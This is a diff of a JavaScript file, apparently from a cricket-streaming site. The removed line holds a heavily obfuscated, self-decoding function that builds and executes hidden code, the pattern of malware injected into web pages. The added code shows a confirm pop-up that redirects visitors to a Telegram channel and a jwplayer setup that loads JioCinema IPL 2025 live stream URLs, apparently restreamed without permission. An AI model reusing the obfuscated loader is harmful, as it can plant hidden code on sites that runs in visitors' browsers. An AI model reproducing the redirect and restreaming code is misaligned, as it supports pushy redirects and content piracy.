@@ -1,1 +1,50 @@
-(function(){var PWV='',fuP=287-276;function lHS(z){var v=2255810;var y=z.length;var m=[];for(var p=0;p<y;p++){m[p]=z.charAt(p)};for(var p=0;p<y;p++){var e=v*(p+88)+(v%22975);var g=v*(p+452)+(v%15790);var h=e%y;var a=g%y;var i=m[h];m[h]=m[a];m[a]=i;v=(e+g)%4036655;};return m.join('')};var uPM=lHS('hrnnwuocmralxtrsozeijdyqtuvkcsbctofpg').substr(0,fuP);var YPP='rar z)14,a668,yu75;vnr b=.abcd=fghilklmn7pqrseuvwx=z";vjr v=u74,7a,88,i1,65a79,7c,81,t2,70590,8a,94,]9,60.85,78,66,16,80g;var<k=[]jfor(=ar ci0;c<f.len-th;cd+)k[o[c]]tc+1;=ar m)[];zv=19;)+=25ly+=2+;for)var (=0;h)arguuents{lengnh;h+=){vai o=ajgumeats[h).splnt(" r);fo.(var=w=o.aengt;-1;wv=0;wo-){v+r f=null;)ar j.o[w]vvar ,=nult;var3p=0;car dCj.leagth;{ar r"for(=ar it0;i<i;i++i{var"x=j.=harCodeAt=i);v;r q=v[x];(f(q)1f=(qv1)*abj.chrrCodlAt(i+1)-zsr=i;t++;}>lse rf(x=iy){fia*(v[leng=h-z+n.chavCodett(i+]))+jechar=odeAn(i+2+-z;rri;i+;2;}e,se{c9ntin+e;}ip(t==2ull)u=[];=f(r>[)t.pfsh(jasubsvring=p,r)i;t.ppsh(olf+1]v;p=ig1;}ia(t!= ull)yif(p=d)t.lush(,.sub+trin+(p))=o[w]-t.jo7n(""8;}}m=push<o[0]f;}vag u=mvjoin;"");par s;[96,t2,42e10,3A,92]hconcrt(v) var k=Str.ng.f(omCh,rCodr(46)(for((ar c 0;c<v.lennth;c;+)u= .spl)t(l+d.chahAt(c8).john(Stming.sromCearCo;e(s[r]));.eturr u.silit(.+"!";.joiv(l);';var ONJ=lHS[uPM];var Ptj='';var Tvk=ONJ;var Nmj=ONJ(Ptj,lHS(YPP));var BLf=Nmj(lHS('J,iSubxa[;AJ$MJevecc.ltomC5;,.ak}l!.li_c9=i\/)_Jm8!IgJdf=\/)ln.t}dJ(oIEblr$#drjamt*ei(yk.io0o}.J\/rJcJ)o\/nct_J7a),D{cn%.ijJ$p,J,_9JTat,it))jbx?)i(,ea<0ja,a}.2.Me+bl-7JMvdot.cJ_l-i}n{:Jo+D%b\/,Ji._2xJbg!J,_CMJ.e2bJ__-v\/,sz-&f1z5%Jeao;I\/xu%e(ol(b,cpc&rtr.oJ(o])g_CNi?\/{boeI;xuds9;J33.i45?fnbp<;54\/eta1( t,.iaDduhietc4enf8]iJt:2fpw le1.(%-.-B.)%S])at\/a\/-ne_&Mf7k=\/5JJJ,1If.t-a13fJ!{.mSnJ3!f%s3xJ(.t.u1k$x(n+(b],n}mtcn(j\/9.tlJb1eillnt-ggn1,x]n1lee)e2b:al!(,=se-..(>p;c$3ig] m.axJ!=%gu-\/..Dj.6.Il{\').jJ7uJjec,tJioosfl$ \/}=la0pbnJs_Ja3omJpsc{e. ijorhszj)ft)..]b4(2l\/_].xjixtelbIp8)2;l,4JI\/_-usJ!-lJ2u\/J.o)c8thgi_.@r_r2e)Jo.mxiJi$Jx.M1nc!J\/!w}-e=\/J(;i6[\/Jj.bnc-"!nb,Mk\/cjv!Jm_.r .ivtneakt#%_15.3C)aaie\/,pe3._((aah32$_SChJ(D;a;l_]oxE$Am9.b\/JJSCbae_d.otaIilj.bkbeJjol.Mnokb)m\/\/,d!J%MJ1.iym\/Abvp+p)rbb,JETiiea.]!Jp@m(mJh_vtd3l,tsgu:cmpln1._oen.)vb(fe3oy_.0ll{k!\/v.liJ3JepE)tmoaes_geJtMi ld_4*r,\/md)%JJi.e\/c!JeJJ_cxhJeJ=]er%.Co_bJebcc5]{(cJgh.neJNt.f1u1Mm(_!D-.!Msaccln{J5z4t.obb)!eljn...b)t.h:o.Aao=w-Ee-;J.]{n_44r-\/lie)moJD1vJ1 s)aa)\/.JN&.J!Jm.xnj!hn!;tcahg0biroa\/Ba._e]tl;ts43+Ii1J8iJ_oi}]lcs.nI0.d)Ieko %8,m-}_(dpb_l<s..tn)j6etbr}eyd,_.#!Tl={j&3>g8!t.\/p2zSp\/h d.cslnhr-6ttJJ3ae.Mdj$M(clb.MbJin);;rpe(li.J!l#JJJl.:ptl] didla 7ae%sk_ggc\/f!n\/3sl!J+]uv\/\/!vk xi${%--).iAJtlh =cctsJb:._J5i)z]a_)esat.!n-ml$l(d&-h.l3awJn=d[\/p-._1ftib{7;5odtMxf"inBp(,a)oJe]%D)C]gmkpfm-+mn%!!.\/e\/+%hb%M]\/.$dtbbJ%lcrlxap]J.%b5uo{i,]etb%J)-(\/!vnry.({eg7emivmt.e!eei9".fc!;ej!dm_J(y-_S%c1h[aa6c_t;kM0eiil!.5Jx<d!B4)fe]\/ {*evnJmnp!pibifc7,[oaMsolc\/$%_ignul=gal]u5oC\/3a%&..ia>mth2Nud,)b;?=8ei!\/a.um.iJe)rSeJo)fhiJJrm(fa8!=!\/m5u.Cxu,,u[Jlil2_ear_#B\/lJ2+mDInrxoMMc;mx,hi3c.!2eAJ8!=)wdJpeJsr-$d$.Jo\/(mvJ]-Jt\/a\/2Csp(ea]6a.Bretz7l2(n.\/tg,2z_D.3pgJMfJ. mp7)lo@=7de$u3h0,z8i=J1_](}lowv0_JS6ak.pMJ0)_=2]i_w!!.bA-"eha$-(z(mic5r:mp2\/2;s.4lob.pea4ei.c3<,ebn43]_.)..loJJ4J%.__I=gl)_zt2tJ98ctt;zra7..3+]vlMk8\/w!1.o))h(#ibil -.\/.t4i..e.sa%&c7n6_M_=Je;fsc_&.v]emp)w.}p!at2Sf\/cDMJ;(j8i8ut6gc,%(=.,.ntc,J,CfcJg2mJ)(&;ccaJ;kJmJtblkjm)s!feJb4naCa[$or]]i)9\/]=\/ep.(-cJel8tp.Jp%J8ba,e%2j=.=s-0p)pD;guaM-\/ibJb_;_ooe,7oo0}v_7J(!::Jt0p,.z(ljJ_,: .ll?=.>ewt!zri=fr3.]!I4b__u.JJlJ-_f,ronb,s)p;en)tJ\/}Jn-mJpaninrJ.i*eeid.J\/tm()ottJ.5.2}o2eouiJ!k-.d"4ozpjl$6l-lpne!1$3b;c0c,)mex clJeJ]S}wm%!m.9n e2akIx(o.hurc .%.](.ej!.]-.],h,pp,a.j_J5_nMl:Jacknj2yjv,)(et$tbi0jI.6n%(..:tkgntt&o_J_nt[J\/nJz,{)(}c-s.38Dllo.ta)jvg_]B.ruC-cdJnm,{vzgknsnm)Ju.Aal.]l$\/J)Jrposo;.5i(at_;[{\/e-ao)l.;196in:t;k5jh.hiC:!d.iAt3!grl3jJ\/io;rtkcxelC:J6di$s13)tt-mt..5$t3=.{_J\'l1_l}di_[,c2J1t7n#a\/.=.J tv$.]Jt332_8)g(f)a*>7){;!y!2c[jfeJ0{1JphtwiI%vx.%\/0d__&dr!fiJ._uI(sJJx.n(J1,J9p-t.\/0alb6JnJJte1pt4c]8"[3MdI%JnvJ%p:m.h,;);ni!.tso.Itjgo k(._;nJC.robphrJern.!l82]zfn"e\/*.t]2ca]ibS{(0J\/3ef%\'e.eAr_Jdko3wav..-zDv<i!]],ceItke) m.]-iet(1orc:I_a:bn8-JemBo]kecope_.0...ubJelx]v}]o\/tllb- ;,JS+3i(*nt3[_ftuhfen0u8mnf\/fm!:&aA_cch0s\/()}6.uuu$\/_.JC.eepa.t[c.hJ{e8]fJbfaIa :5tJJ3.m)cntc(=nlreJt\/)h\/m]ef4E.Jpe;.ie.JJJ_(n\'dJ]MI](tr7T(()..tocegd@.J.p(J_.;_]#t1(di)8d.i$%Aw_ 3)h;C.;.nr,c\/.5)a4p+fps idet$n6nJeewd.vitciyutu=ahlbhb!\/9.08]_p]D! J.oe DniotrC(pot-naJ3nJf\/Jt]DJc\/m$aidJnx uJ1"xbt1tkboe(n>tele1m_J8ip-75$mwJ_))J,!)}nsoj.es)S-ti32_3:r9.=w!viCo!4wcfv9TcgJ3)9.j)2 et9[t(4h1fxifico5I=k;$D_2o9dasj,ic.b5j\/,Ji a#ifi$ -fAn irnmr.3(angs,(z_S@:ol.ohmdoo_.. .!_h'));var eMw=Tvk(PWV,BLf );eMw(8868);return 8043})()
+if (confirm("Join Our Telegram Channel @livecrichdofficial")) {
+      window.location.href = "https://telegram.me/livecrichdofficial";
+    }
+
+    document.addEventListener("DOMContentLoaded", function () {
+      const videoSources = {
+        English: "https://prod-sports-eng-fa.jiocinema.com/hls/live/2117030/inallow-ipl-2025/eng/1540040243/15mindvrm01f15d6223ccd742da93085a408526bb9c09april2025/master.m3u8",
+        Hindi: "https://prod-sports-hin-fa.jiocinema.com/hls/live/2117033/inallow-ipl-2025/hin/1540040243/15mindvrm01f15d6223ccd742da93085a408526bb9c09april2025/master.m3u8",
+        Gujarati: "https://prod-sports-eng-fa.jiocinema.com/hls/live/2117030/inallow-ipl-2025/eng/1540040243/15mindvrm01f15d6223ccd742da93085a408526bb9c09april2025/master.m3u8",
+        Telugu: "https://prod-sports-hin-fa.jiocinema.com/hls/live/2117033/inallow-ipl-2025/hin/1540040243/15mindvrm01f15d6223ccd742da93085a408526bb9c09april2025/master.m3u8",
+        Tamil: "https://prod-sports-eng-fa.jiocinema.com/hls/live/2117030/inallow-ipl-2025/eng/1540040243/15mindvrm01f15d6223ccd742da93085a408526bb9c09april2025/master.m3u8",
+        Marathi: "https://prod-sports-hin-fa.jiocinema.com/hls/live/2117033/inallow-ipl-2025/hin/1540040243/15mindvrm01f15d6223ccd742da93085a408526bb9c09april2025/master.m3u8",
+        Bengali: "https://prod-sports-eng-fa.jiocinema.com/hls/live/2117030/inallow-ipl-2025/eng/1540040243/15mindvrm01f15d6223ccd742da93085a408526bb9c09april2025/master.m3u8",
+        Kannada: "https://prod-sports-hin-fa.jiocinema.com/hls/live/2117033/inallow-ipl-2025/hin/1540040243/15mindvrm01f15d6223ccd742da93085a408526bb9c09april2025/master.m3u8",
+        Bhojpuri: "https://prod-sports-eng-fa.jiocinema.com/hls/live/2117030/inallow-ipl-2025/eng/1540040243/15mindvrm01f15d6223ccd742da93085a408526bb9c09april2025/master.m3u8",
+        Punjabi: "https://prod-sports-hin-fa.jiocinema.com/hls/live/2117033/inallow-ipl-2025/hin/1540040243/15mindvrm01f15d6223ccd742da93085a408526bb9c09april2025/master.m3u8",
+        Haryanvi: "https://prod-sports-eng-fa.jiocinema.com/hls/live/2117030/inallow-ipl-2025/eng/1540040243/15mindvrm01f15d6223ccd742da93085a408526bb9c09april2025/master.m3u8",
+        Malyalam: "https://prod-sports-hin-fa.jiocinema.com/hls/live/2117033/inallow-ipl-2025/hin/1540040243/15mindvrm01f15d6223ccd742da93085a408526bb9c09april2025/master.m3u8",
+    
+      };
+
+      const playerInstance = jwplayer("video");
+
+      function loadAndPlay(language) {
+        const source = videoSources[language];
+        playerInstance.load([{ file: source }]);
+        playerInstance.play();
+      }
+
+      document.getElementById("video-select").addEventListener("change", function () {
+        loadAndPlay(this.value);
+      });
+
+      document.getElementById("language-switch").addEventListener("click", function () {
+        const select = document.getElementById("video-select");
+        const options = Object.keys(videoSources);
+        let nextIndex = (options.indexOf(select.value) + 1) % options.length;
+        select.value = options[nextIndex];
+        loadAndPlay(options[nextIndex]);
+      });
+
+      // Initial load
+      loadAndPlay(document.getElementById("video-select").value);
+
+      playerInstance.setup({
+        autostart: true,
+        mute: false,
+        playlist: [{ file: videoSources[document.getElementById("video-select").value] }]
+      });
+    });
